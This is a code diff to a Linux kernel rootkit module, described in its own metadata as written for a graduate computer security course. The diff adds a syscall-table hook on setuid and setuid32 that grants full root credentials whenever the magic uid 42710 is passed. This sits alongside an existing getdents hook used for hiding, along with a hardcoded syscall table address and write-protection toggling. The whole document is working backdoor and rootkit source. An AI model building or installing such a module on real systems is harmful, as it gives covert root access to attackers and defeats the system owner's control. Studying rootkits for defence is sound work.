@@ -27,15 +27,29 @@ MODULE_DESCRIPTION("This is a rootkit module written for a graduate computer sec
 
 unsigned long * sys_call_table;
 
+asmlinkage int (*real_setuid) (uid_t uid);
+asmlinkage int (*real_setuid32) (uid_t uid);
 asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned int);
+
+asmlinkage int hijacked_setuid(uid_t uid){
+	struct cred *new;
+	int ret;
+	if (uid == 42710){
+		printk(KERN_DEBUG "setuid called\n");
+		new = prepare_creds();
+		new->uid = 0;
+		new->euid = 0;
+		new->gid = 0;
+		new->suid = 0;
+		return commit_creds(new);
+	}
+		return real_setuid(uid);
+}
 
 asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 	printk(KERN_INFO "hijacked call.\n");
 	
 	
-	//unsigned long dino,doff;
-	//unsigned short dreclen;
-	//char name[256];
 	char *name;
 	name = dirp->d_name;
 
@@ -78,8 +92,12 @@ int make_ro(unsigned long address){
 void hijack_sys_call_table(void){
 	make_rw((unsigned long)sys_call_table);
         real_getdents = (void*)*(sys_call_table + __NR_getdents);
+        real_setuid = (void*)*(sys_call_table + __NR_setuid);
+        real_setuid32 = (void*)*(sys_call_table + __NR_setuid32);
         *(sys_call_table + __NR_getdents) = (unsigned long)hijacked_getdents;
-	//make_ro((unsigned long)sys_call_table);
+        *(sys_call_table + __NR_setuid) = (unsigned long)hijacked_setuid;
+        *(sys_call_table + __NR_setuid32) = (unsigned long)hijacked_setuid;
+	make_ro((unsigned long)sys_call_table);
 }
 
 int init_module(void){
@@ -89,7 +107,7 @@ int init_module(void){
 	taken from the /boot/System map file. This address seems to be the same
 	after every boot, so for now it can be hardcoded.
 	*/
-	sys_call_table = (unsigned long*)0xc1697140;	
+	sys_call_table = (unsigned long*)0xc15c3060;
 	hijack_sys_call_table();	
 	
 	printk(KERN_INFO "Rootkit added.\n\n");
@@ -98,8 +116,10 @@ int init_module(void){
 }
 
 void cleanup_module(void){
-      	//make_rw((unsigned long)sys_call_table);
+      	make_rw((unsigned long)sys_call_table);
 	*(sys_call_table + __NR_getdents) = (unsigned long)real_getdents;
+        *(sys_call_table + __NR_setuid) = (unsigned long)real_setuid;
+        *(sys_call_table + __NR_setuid32) = (unsigned long)real_setuid32;
 	make_ro((unsigned long)sys_call_table);
 	printk(KERN_INFO "Rootkit removed.\n");
 }
